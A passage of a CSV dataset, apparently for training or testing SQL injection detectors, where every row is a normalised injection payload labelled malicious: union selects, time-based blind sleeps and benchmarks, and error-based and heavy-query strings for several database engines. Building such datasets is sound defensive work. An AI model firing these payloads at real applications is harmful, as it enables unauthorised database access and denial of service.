row_index,payload_norm,label,sqli_type_hint
6630,1' ) ) as zari where 6847 = 6847,1,
6631,"-9588' ) ) union all select 7280,7280,7280,7280,7280,7280,7280,7280,7280,7280--",1,
6632,"1' or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
6633,"1"" ) as rbgl where 3822 = 3822 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) --",1,
6634,"-3781 ) union all select 3916,3916,3916--",1,
6635,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ""seci"" = ""seci",1,
6636,"-5849 ) union all select 6168,6168,6168,6168,6168,6168,6168,6168#",1,
6637,"1"" ) ) union all select null,null,null,null,null,null--",1,
6638,"1' ) as ildf where 5545 = 5545 union all select null,null,null,null#",1,
6639,"-3955 where 7276 = 7276 union all select 7276,7276,7276,7276,7276,7276,7276,7276,7276--",1,
6640,"1"" ) union all select null,null,null,null,null#",1,
6641,"-3415 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) -- jove",1,
6642,"1' ) as jwvp where 5231 = 5231 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
6643,"1"" ) as ubva where 6369 = 6369 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
6644,1 ) as nwfz where 7365 = 7365 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,1,
6645,"1"" ) ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,
6646,"1%' ) and make_set ( 1458 = 3902,3902 ) and ( '%' = '",1,
6647,"-2289"" ) or 8624 = 6279 and ( ""ised"" = ""ised",1,
6648,"1%' ) ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
6649,"1%' ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( '%' = '",1,
6650,"-6412 ) ) as cnfs where 6557 = 6557 union all select 6557,6557,6557,6557,6557,6557,6557,6557,6557#",1,
6651,"1%' ) ) and make_set ( 8403 = 8403,8899 ) and ( ( '%' = '",1,
6652,"1%"" ) ) )",1,
6653,"1'+ ( select 'ndpx' where 4061 = 4061 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
6654,"1' ) ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,
6655,1' ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,1,
6656,"1"" where 5552 = 5552 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
6657,1'+ ( select 'wpnm' where 8223 = 8223 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) ) +',1,
6658,"1' ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( 'qeet' = 'qeet",1,
6659,"-5826"" ) ) union all select 7192,7192#",1,
